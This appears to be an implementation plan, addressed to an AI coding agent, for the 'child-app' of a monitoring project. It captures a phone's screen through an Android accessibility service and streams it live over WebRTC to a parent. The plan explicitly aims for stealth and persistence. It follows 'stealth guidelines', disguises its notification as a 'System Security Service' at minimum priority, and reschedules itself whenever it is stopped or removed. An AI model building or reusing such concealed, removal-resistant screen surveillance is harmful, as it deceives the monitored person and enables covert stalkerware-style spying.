# Layer 9: ScreenCaptureService (REVISED) Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Establish a stealthy, low-overhead, reboot-resilient real-time screen monitoring stream from the child's device using `AccessibilityService.takeScreenshot()` and a custom WebRTC video capture pipeline.

**Architecture:** Create `GuardianAccessibilityService` to capture screen frames silently (replaces flaky `MediaProjection` token). Integrate the frames into a custom WebRTC `VideoCapturer` loop within `ScreenCaptureService` that adaptively tunes frame rate and JPEG quality based on battery and network state. Perform bitmap downscaling in memory to prevent crashes on budget Indian smartphones.

**Tech Stack:** WebRTC (`io.getstream:stream-webrtc-android`), Socket.IO signaling, Android Accessibility API (API 30+), Kotlin Coroutines + Flow.

---

## User Review Required

Documenting critical engineering adjustments for maximum transparency:

> [!IMPORTANT]
> **API Level Restriction**: `AccessibilityService.takeScreenshot()` is only available on Android 11 (API 30) and above. On legacy Android versions (API 26-29), the capture service will gracefully log an unsupported warning and stand by without crashing.

> [!TIP]
> **Extreme Memory Guarding**: To prevent Out Of Memory (OOM) errors on cheap ₹8,000 Indian devices, we scale down the screenshot bitmaps to a target width of `360px` (preserving aspect ratio) before YUV conversion. This reduces processed pixels by ~9x and memory footprint by ~90%. All temporary bitmaps are strictly recycled immediately inside the loop.

---

## Open Questions

None at this stage. The requirements are fully aligned with the `AGENTS.md` stealth guidelines and system architecture constraints.

---

## Proposed Changes

### Component 1: Accessibility Configuration

#### [NEW] [accessibility_service_config.xml](file:///c:/Users/ash74/OneDrive/Desktop/SIH-%201/guardian-shield/child-app/src/main/res/xml/accessibility_service_config.xml)
Configure the accessibility service to enable screenshot capabilities.

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canTakeScreenshot="true"
    android:notificationTimeout="100" />
```

---

### Component 2: Accessibility Service Implementation

#### [NEW] [GuardianAccessibilityService.kt](file:///c:/Users/ash74/OneDrive/Desktop/SIH-%201/guardian-shield/child-app/src/main/kotlin/com/guardianshield/child/services/GuardianAccessibilityService.kt)
Implement the service that handles screen frame capture and exposes a static handle for the screen capturer.

```kotlin
package com.guardianshield.child.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class GuardianAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: GuardianAccessibilityService? = null
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Unused for screen capture, can be extended for package monitoring later.
    }

    override fun onInterrupt() {
        // No-op
    }
}
```

---

### Component 3: Android Manifest Updates

#### [MODIFY] [AndroidManifest.xml](file:///c:/Users/ash74/OneDrive/Desktop/SIH-%201/guardian-shield/child-app/src/main/AndroidManifest.xml)
Declare `GuardianAccessibilityService` in the manifest and bind the configuration.

```diff
         <service
             android:name=".services.ScreenCaptureService"
             android:exported="false" />
 
+        <!-- Guardian Accessibility Service for Stealth Screen Capture -->
+        <service
+            android:name=".services.GuardianAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <!-- Boot receiver -->
```

---

### Component 4: WebRTC Video Pipeline & Screen Capture Service

#### [MODIFY] [ScreenCaptureService.kt](file:///c:/Users/ash74/OneDrive/Desktop/SIH-%201/guardian-shield/child-app/src/main/kotlin/com/guardianshield/child/services/ScreenCaptureService.kt)
Build the complete WebRTC PeerConnection factory, Signaling connection handler, custom `VideoCapturer` loop, adaptive limits calculations, and downscaled YUV converter.

```kotlin
package com.guardianshield.child.services

import android.accessibilityservice.AccessibilityService
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import android.view.Display
import androidx.core.app.NotificationCompat
import com.guardianshield.child.data.local.LocationDataStore
import com.guardianshield.child.data.remote.SignalingClient
import com.guardianshield.child.domain.model.SignalingMessage
import com.guardianshield.child.utils.Constants
import com.guardianshield.child.utils.NetworkType
import com.guardianshield.child.utils.NetworkUtils
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.collectLatest
import org.webrtc.*
import java.io.ByteArrayOutputStream
import javax.inject.Inject

@AndroidEntryPoint
class ScreenCaptureService : Service() {

    private val tag = "ScreenCaptureService"

    @Inject
    lateinit var signalingClient: SignalingClient

    @Inject
    lateinit var locationDataStore: LocationDataStore

    @Inject
    lateinit var networkUtils: NetworkUtils

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    
    // WebRTC Core
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var rootEglBase: EglBase? = null

    // Capture Loop State
    private var captureJob: Job? = null
    private var isStreaming = false
    private var currentCapturerObserver: CapturerObserver? = null

    override fun onCreate() {
        super.onCreate()
        initializeWebRTC()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(Constants.NOTIFICATION_ID + 3, buildNotification())
        
        serviceScope.launch {
            val familyId = locationDataStore.getFamilyId()
            if (familyId != null) {
                signalingClient.connect(familyId)
            }
        }

        // Collect incoming signaling packets
        serviceScope.launch {
            signalingClient.incomingSignals.collect { msg ->
                handleIncomingSignal(msg)
            }
        }

        return START_STICKY
    }

    private fun initializeWebRTC() {
        try {
            rootEglBase = EglBase.create()
            val initOptions = PeerConnectionFactory.InitializationOptions.builder(applicationContext)
                .createInitializationOptions()
            PeerConnectionFactory.initialize(initOptions)

            val options = PeerConnectionFactory.Options()
            peerConnectionFactory = PeerConnectionFactory.builder()
                .setOptions(options)
                .createPeerConnectionFactory()
            Log.d(tag, "WebRTC peer connection factory initialized successfully")
        } catch (e: Exception) {
            Log.e(tag, "Failed to initialize WebRTC components: ${e.message}", e)
        }
    }

    private fun handleIncomingSignal(msg: SignalingMessage) {
        when (msg.type) {
            "join", "ready" -> {
                Log.d(tag, "Parent joined signaling channel. Initiating WebRTC streaming offer.")
                startWebRTCStream()
            }
            "answer" -> {
                Log.d(tag, "Received SDP answer from parent.")
                val sdp = SessionDescription(SessionDescription.Type.ANSWER, msg.sdp)
                peerConnection?.setRemoteDescription(object : SimpleSdpObserver() {
                    override fun onSetSuccess() {
                        Log.d(tag, "Remote description applied successfully.")
                    }
                }, sdp)
            }
            "candidate" -> {
                Log.d(tag, "Received ICE candidate from parent.")
                val candidate = IceCandidate(msg.sdpMid!!, msg.sdpMLineIndex!!, msg.candidate!!)
                peerConnection?.addIceCandidate(candidate)
            }
            "leave" -> {
                Log.d(tag, "Parent left. Terminating WebRTC screen stream.")
                stopWebRTCStream()
            }
        }
    }

    private synchronized fun startWebRTCStream() {
        if (isStreaming) return
        isStreaming = true

        val factory = peerConnectionFactory ?: return
        
        // 1. Create VideoSource & VideoTrack
        videoSource = factory.createVideoSource(true) // screencast
        videoTrack = factory.createVideoTrack("gs_screen_track", videoSource)
        
        currentCapturerObserver = videoSource?.capturerObserver

        // 2. Setup PeerConnection Config & STUN servers
        val rtcConfig = PeerConnection.RTCConfiguration(
            listOf(
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer()
            )
        ).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        }

        peerConnection = factory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            
            override fun onIceCandidate(candidate: IceCandidate) {
                // Send ICE Candidate to parent
                val signal = SignalingMessage(
                    type = "candidate",
                    sdpMid = candidate.sdpMid,
                    sdpMLineIndex = candidate.sdpMLineIndex,
                    candidate = candidate.sdp
                )
                signalingClient.sendSignal(signal)
            }

            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, mediaStreams: Array<out MediaStream>?) {}
        })

        // 3. Attach track to peer connection
        peerConnection?.addTrack(videoTrack, listOf("gs_screen_stream"))

        // 4. Start Screen Frame Grabber Loop
        startCaptureLoop()

        // 5. Create and send offer SDP
        val mediaConstraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
        }

        peerConnection?.createOffer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(sdp: SessionDescription) {
                peerConnection?.setLocalDescription(object : SimpleSdpObserver() {
                    override fun onSetSuccess() {
                        Log.d(tag, "Local offer set successfully. Sending to parent.")
                        val signal = SignalingMessage(
                            type = "offer",
                            sdp = sdp.description
                        )
                        signalingClient.sendSignal(signal)
                    }
                }, sdp)
            }
        }, mediaConstraints)
    }

    private fun startCaptureLoop() {
        captureJob?.cancel()
        captureJob = serviceScope.launch {
            while (isActive) {
                val stats = calculateAdaptiveLimits()
                val startTime = SystemClock.elapsedRealtime()
                
                captureFrame(stats.quality)
                
                val duration = SystemClock.elapsedRealtime() - startTime
                val sleepTime = maxOf(0L, (1000L / stats.frameRate) - duration)
                delay(sleepTime)
            }
        }
    }

    data class AdaptiveStats(val frameRate: Int, val quality: Int)

    private fun calculateAdaptiveLimits(): AdaptiveStats {
        // Battery Check
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        if (batteryPct < 15) {
            // Low battery survival fallback
            return AdaptiveStats(frameRate = 5, quality = 35)
        }

        // Network Check
        return when (networkUtils.getCurrentNetworkType()) {
            NetworkType.WIFI, NetworkType.NR -> AdaptiveStats(frameRate = 15, quality = 80)
            NetworkType.LTE -> AdaptiveStats(frameRate = 12, quality = 65)
            NetworkType.UMTS -> AdaptiveStats(frameRate = 8, quality = 50)
            else -> AdaptiveStats(frameRate = 5, quality = 35) // EDGE/2G fallback
        }
    }

    private fun captureFrame(quality: Int) {
        val accessibilityService = GuardianAccessibilityService.instance
        if (accessibilityService == null) {
            Log.e(tag, "GuardianAccessibilityService reference is dead. Cannot capture.")
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            accessibilityService.takeScreenshot(
                Display.DEFAULT_DISPLAY,
                applicationContext.mainExecutor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                        serviceScope.launch(Dispatchers.Default) {
                            val buffer = screenshotResult.hardwareBuffer
                            val colorSpace = screenshotResult.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
                            buffer.close() // Avoid hardware leaks

                            if (bitmap != null) {
                                processAndFeedFrame(bitmap, quality)
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(tag, "Screenshot capture failed with error: $errorCode")
                    }
                }
            )
        }
    }

    private fun processAndFeedFrame(bitmap: Bitmap, quality: Int) {
        try {
            // 1. Memory Guarding: Downscale to standard 360px width to protect low-end CPUs
            val targetWidth = 360
            val targetHeight = (targetWidth * bitmap.height) / bitmap.width
            val scaledBitmap = Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true)
            bitmap.recycle() // Free original screen grab

            // 2. Compressing to JPEG byte array matching adaptive quality limits
            val bos = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos)
            val jpegBytes = bos.toByteArray()
            scaledBitmap.recycle() // Free intermediate scaled bitmap

            // 3. Decoding back to format-compliant frame
            val compressedBitmap = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.size) ?: return
            
            val width = compressedBitmap.width
            val height = compressedBitmap.height
            val argb = IntArray(width * height)
            compressedBitmap.getPixels(argb, 0, width, 0, 0, width, height)
            compressedBitmap.recycle() // Free decompressed model

            // 4. Dynamic ARGB to NV21 (YUV) byte conversion
            val yuvBytes = ByteArray(width * height + (width * height / 2))
            encodeARGBToNV21(yuvBytes, argb, width, height)

            // 5. Wrap in WebRTC Buffer and notify local VideoSource
            val timestampNs = System.nanoTime()
            val nv21Buffer = NV21Buffer(yuvBytes, width, height, null)
            val videoFrame = VideoFrame(nv21Buffer, 0, timestampNs)
            
            currentCapturerObserver?.onFrameCaptured(videoFrame)
            videoFrame.release()
        } catch (e: Exception) {
            Log.e(tag, "Error processing frame pipeline: ${e.message}", e)
        }
    }

    private fun encodeARGBToNV21(yuv: ByteArray, argb: IntArray, width: Int, height: Int) {
        val frameSize = width * height
        var yIndex = 0
        var uvIndex = frameSize
        var index = 0
        
        for (j in 0 until height) {
            for (i in 0 until width) {
                val pixel = argb[index++]
                val r = (pixel and 0xff0000) ushr 16
                val g = (pixel and 0xff00) ushr 8
                val b = pixel and 0xff

                val y = (66 * r + 129 * g + 25 * b + 128 ushr 8) + 16
                yuv[yIndex++] = maxOf(0, minOf(255, y)).toByte()

                if (j % 2 == 0 && i % 2 == 0) {
                    val u = (-38 * r - 74 * g + 112 * b + 128 ushr 8) + 128
                    val v = (112 * r - 94 * g - 18 * b + 128 ushr 8) + 128
                    yuv[uvIndex++] = maxOf(0, minOf(255, v)).toByte()
                    yuv[uvIndex++] = maxOf(0, minOf(255, u)).toByte()
                }
            }
        }
    }

    private synchronized fun stopWebRTCStream() {
        if (!isStreaming) return
        isStreaming = false
        
        captureJob?.cancel()
        captureJob = null
        currentCapturerObserver = null

        try {
            peerConnection?.close()
            peerConnection = null
            videoTrack?.dispose()
            videoTrack = null
            videoSource?.dispose()
            videoSource = null
            Log.d(tag, "WebRTC streaming terminated and hardware resources freed successfully")
        } catch (e: Exception) {
            Log.e(tag, "Error during WebRTC disposal: ${e.message}", e)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleRestart()
    }

    override fun onDestroy() {
        stopWebRTCStream()
        signalingClient.disconnect()
        serviceScope.cancel()
        
        try {
            rootEglBase?.release()
            rootEglBase = null
            peerConnectionFactory?.dispose()
            peerConnectionFactory = null
        } catch (e: Exception) {
            // Ignore
        }

        scheduleRestart()
        super.onDestroy()
    }

    private fun scheduleRestart() {
        val intent = Intent(applicationContext, ScreenCaptureService::class.java)
        val pi = PendingIntent.getService(
            applicationContext, Constants.RESTART_REQUEST_CODE + 3, intent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000L, pi)
    }

    private fun buildNotification() = NotificationCompat.Builder(this, Constants.CHANNEL_ID)
        .setContentTitle("System Security Service") 
        .setContentText("Ambient engine executing normally")
        .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setSilent(true)
        .setOngoing(true)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    // Simple SDP observer callback adapter
    open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(sdp: SessionDescription) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(error: String?) {
            Log.e("ScreenCaptureService", "SdpObserver onCreateFailure: $error")
        }
        override fun onSetFailure(error: String?) {
            Log.e("ScreenCaptureService", "SdpObserver onSetFailure: $error")
        }
    }
}
